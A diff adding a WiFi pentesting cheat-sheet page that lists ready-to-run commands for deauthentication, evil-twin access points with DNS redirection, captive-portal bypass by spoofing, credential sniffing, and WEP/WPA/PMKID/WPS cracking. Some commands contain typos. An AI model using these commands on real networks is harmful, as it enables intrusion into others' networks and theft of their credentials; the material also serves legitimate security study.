@@ -1,0 +1,304 @@
+import { Tab, Tabs } from 'nextra-theme-docs'
+
+## Managing interfaces
+### Interface status
+<Tabs items={['iw', 'ip']}>
+    <Tab>
+    ```bash filename="Terminal" copy
+    iw dev
+    iw wlan0 link
+    ```
+    </Tab>
+     <Tab>
+    ```bash filename="Terminal" copy
+    ip link show wlan0
+    ```
+    </Tab>
+</Tabs>
+### Up/Down Interfaces
+<Tabs items={['ip', 'ifconfig']}>
+    <Tab>
+    ```bash filename="Terminal" copy
+    ip link set dev wlan0 up/down
+    ```
+    </Tab>
+     <Tab>
+    ```bash filename="Terminal" copy
+    ifconfig wlan0 up/down
+    ```
+    </Tab>
+</Tabs>
+### Configure interface on specific channel
+```bash filename="Terminal" copy
+iwconfig wlan0mon channel 1
+```
+### Scan wifi networks
+<Tabs items={['iw', 'nmcli']}>
+    <Tab>
+    ```bash filename="Terminal" copy
+    iw dev wlan0 scan
+    iw wlan0 scan
+    ```
+    </Tab>
+     <Tab>
+    ```bash filename="Terminal" copy
+    nmcli dev wifi list
+    ```
+    </Tab>
+</Tabs>
+### Connect to a wifi network
+```bash filename="Terminal" copy
+nmcli dev wifi connect SSID_NAME password PASSWORD
+```
+### Monitor mode
+<Tabs items={['airmon-ng', 'iwconfig']}>
+    <Tab>
+    ```bash filename="Terminal" copy
+    sudo airmon-ng check kill # kill processes that may interfere with airmon-ng
+    sudo airmon-ng start wlan0
+    sudo airmon-ng stop wlan0mon
+    ```
+    </Tab>
+     <Tab>
+    ```bash filename="Terminal" copy
+    sudo systemctl stop NetworkManager # Disable network manager to stop it from interfering with monitor mode
+    # List wireless interfaces
+    iwconfig
+    ip
+    sudo ip link set wlan0 down # Disable the interface
+    sudo iwconfig wlan0 mode monitor # Change the interface mode to monitor
+    sudo ip link set wlan0 up # Re-enable the interface
+    ```
+    </Tab>
+</Tabs>
+### Change MAC 
+<Tabs items={['macchanger', 'ifconfig']}>
+    <Tab>
+    ```bash filename="Terminal" copy
+    sudo macchanger -r wlan0 # Changes the MAC to a random one
+    sudo macchanger -m 00:11:22:33:44:55 wlan0
+    ```
+    </Tab>
+     <Tab>
+    ```bash filename="Terminal" copy
+    sudo ifconfig wlan0 down # disable the interface
+    sudo ifconfig wlan0 hw ether 00:11:22:33:44:55 # Sets a specific MAC address
+    sudo ifconfig wlan0 up # Re-enable the itnerface
+    ```
+    </Tab>
+</Tabs>
+## Offensive WiFi Recon
+### Wifi Packet Dump
+```bash filename="Terminal" copy
+sudo airodump-ng --band bag -w [outputfile] --gpsd wlan0mon
+# --band bag ==> list all networks operating in 2.4 and 5 GHz
+# --gpsd  ==> Record GPS cordinates
+# -c ==> channel
+# --bssid 
+# -w ==> output toa file
+# airodump-ng hot keys
+=====================
+s ==> sort. press multiple times to sort based on different things
+TAB ==> enter selection mode
+m ==> after selecting an AP, coloring 
+Space ==> pause screen output
+```
+
+### Wifi Packet Analysis
+```bash filename="Terminal" copy
+python3 wifi_db.py -d database.db /airodump_output_dir/
+# -d ==> sqlite file to import analyzed database
+
+sqlitebrowser -d database.db # view the generated db
+```
+
+### Hidden Networks 
+#### Listing hidden networks
+```bash filename="Terminal" copy
+sudo iwlist wlan0 scan
+
+sudo airodump-ng wlan0mon 
+# some hidden networks will show the length of their ESSID, and we can abuse that info to bruteforce it
+```
+
+#### Obtaining hidden ESSID
+1. Bruteforce ESSID
+```bash filename="Terminal" copy
+mdk4 wlan0mon p -t [BSSID] -f [ESSID-DIC] 
+# p ==> is for guessing and auditing hidden networks
+# -t ==> MAC of the target network
+# -f ==> wordlist 
+```
+2. Client Reconnect
+- Access points may reveal their names while connecting/reconnecting with clients, so we can either wait for a client to reconnect to that hiddne network, or we can force that by performing a **Deauth attack**
+
+## Wifi Attacks
+### Packet Capture
+```bash filename="Terminal" copy
+sudo airodump-ng --band ag -w [outputfile] --gpsd wlan0mon
+sudo airodump-ng -c [channel] -w [outputfile] wlan0mon # focus on specific channel
+```
+### Packet Injection
+- Test if the device supports packet Injection
+```bash filename="Terminal" copy
+sudo aireplay-ng --test wlan0
+```
+
+- ARP injection attack
+```bash filename="Terminal" copy
+sudo aireplay-ng -3 -b [target_BSSID] -h [your_MAC] wlan0 # -3 aireplay-ng attack mode (arpreplay attack) 
+```
+### OPN Networks
+#### Bypassing captive portals
+##### MAC spoofing
+Use one of the following methods 
+```bash filename="Terminal" copy
+sudo systemctl stop NetworkManager
+sudo ip link set dev <INTERFACE> address <NEW_MAC_ADDRESS>
+```
+Or
+```bash filename="Terminal" copy
+ip link set wlan2 down
+macchanger -m <CLIENT_MAC> <INTERFACE>
+ip link set wlan2 up
+```
+Now, Create the `wifi_opn.conf`
+```JSON filename="Terminal" copy
+network={
+    ssid="SSID_NAME"
+    key_mgmt=NONE
+}
+```
+connect to network with **wpa_supplicant**
+```bash filename="Terminal" copy
+sudo wpa_supplicant -i <INTERFACE> -c wifi-opn.conf
+```
+##### IP spoofing
+1. Enable ip forwarding
+```bash copy filename="Terminal"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+2. MITM attack by ARP spoofing
+```bash copy filename="Terminal"
+ettercap -T -q -i wlan0 -w dump -M ARP /<AUTHORIZED_CLIENT_IP>/ /<GATEWAY_IP>/
+```
+3. Spoof authenticated IP
+```bash copy filename="Terminal"
+iptables -t nat -A OUTPUT -d ! <LAN> -j SNAT --to <AUTHORIZED_CLIENT_IP>
+```
+4. Increate TTL by 1 to avoide detection
+```bash copy filename="Terminal"
+iptables -t mangle -A FORWARD -d <AUTHORIZED_CLIENT_IP> -j TTL --ttl-inc 1
+```
+##### Credentials Theft
+If the captive portal doesn't use TLS, we can view the credentials in clear text by sniffing the traffic
+- Sniff traffic
+```bash copy filename="Terminal"
+ sudo airodump-ng <INTERFACE_MON> -w ~/wifi/scan --manufacturer --wps -c <CHANNEL>
+```
+- Filter the HTTP traffic using wiresharek
+##### DNS Tunnel bypass
+Since DNS requests are generally allowed even on networks with captive portals, this protocol can be used to create a communication channel that bypasses portal restrictions.
+##### Captive portal webtest
+Try to find a vulnerability in the captive portal itself to bypass the login
+
+#### Evil Twin 
+1. Create a **hostpad** config file 
+```bash copy filename="hostpad.conf" 
+interface=wlan0
+ssid=FakeOpenNetwork
+channel=6
+```
+2. Configure DHCP server with **dnsmask** by modifying `/etc/dnsmasq.conf`
+```text copy filename="dnsmasq.conf"
+interface=wlan0
+dhcp-range=192.168.1.50,192.168.1.150,12h
+```
+3. We can also configure **dnsmasq** to redirect dns queries of the victims to an actual fake dns server so we can redirect them to fake attacker controlled websites
+```bash copy filename="dnsmask.conf"
+address=/example.com/192.168.1.100
+```
+
+#### View unencrypted traffic
+- Using **tcpdump** and **wireshark** or with **airodump-ng**
+```bash copy filename="Terminal"
+tcpdump -i wlan0 -w capture.pcap
+
+wireshark capture.pcap
+```
+### OWE 
+Opportunistic wireless encryption, was introduced with WPA3 to prpotect OPN networks by encrypting the traffic even without using a shared password. can be attacked by:
+- Evil Twin Attacks
+- Social Engineering: create fake login pages with SET (Social engineering toolkit)
+
+### WEP
+Wired Equivilent Privacy. was the first attempt to encrypt the wifi communications 1999.
+- Capturing and Cracking WEP traffic
+#### Accelerating IV capturing 
+1. Fake Authentication
+Sending fake authentication packets to the AP to collect more IVs
+```bash copy fielname="Terminal"
+aireplay-ng -1 0 -a <AP MAC> -h <Client MAC> wlan0mon
+
+```
+2. ARP Request Replay Attack (arpreplay)
+Capture valid ARP packets, then repeatedly re-inject them into the network.
+```bash copy fielname="Terminal"
+aireplay-ng --arpreplay -b <AP MAC> -h <Fake Client MAC> wlan0mon
+```
+
+3. Deauthentication Attacks
+Force clients to deautnenticate from the AP to force them to authenticate again then capture their IVs during the authentication processes
+```bash copy fielname="Terminal"
+aireplay-ng  -0 1000 -a <AP MAC> -c <Client MAC> wlan0mon
+```
+#### Dumping traffic
+```bash copy fielname="Terminal"
+airodumpp-ng -c channel_num -bssid BSSID -w output-file wlaGn0mon
+```
+#### Cracking the key through the IVs
+```bash copy fielname="Terminal"
+aircrack-ng capture.cap -b <AP-MAC> 
+#### Automatic Attack
+```bash copy fielname="Terminal"
+besside-ng -c 3 -b <AP-MAC> wlan0mon -v
+````
+### PSK
+1. Deauthentication attack to force clients to do the handshake again
+```bash copy fielname="Terminal"
+sudo aireplay-ng -0 1000  -a <BSSID> -c <ClientMAC> wlan0mon
+
+```
+2. Capture handshakes
+```bash copy fielname="Terminal"
+sudo airodump-ng wlan0mon -c <channel> -w ~/wifi/capture
+```
+3. Cracking against a dictionary
+```bash copy fielname="Terminal"
+# Cracking with aircrack-ng
+sudo aircrack-ng -w /path/to/dictionary.txt capture-01.cap
+
+# Cracking with hashcat
+hcxpcapngtool aux.pcap -o hash.22000 # export pcap file to hashcat mode 22000
+sudo hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force # Cracking with hashcat
+```
+#### PMKID vulnerability
+The clientless attack
+```bash copy fielname="Terminal"
+sudo hcxdumptool -i wlan0mon -w capture.pcapng # capture the PMKID 
+aircrack-ng capture.cap # analyze the cap file to check if it has a PMKID or not 
+sudo hcxpcapngtool -o capture.22000 capture.pcapng # convert it to a hashcat format
+sudo hashcat -m 22000 -a 0 capture.22000 /path/to/dictionary.txt # crack
+```
+#### NoAP
+Also known as half-handshake attack
+#### WPS Pin
+```bash copy fielname="Terminal"
+sudo wash -i wlan0mon # Identify networks with WPS enabled
+airodump-ng --wps # Identify networks with WPS enabled
+sudo reaver -i wlan0mon -b <BSSID> -vv # obtain the WPS pin and PSK key
+```
+### Custom Dictionaries
+```
+cewl -d 2 -m 5 -w docswords.txt 
+```
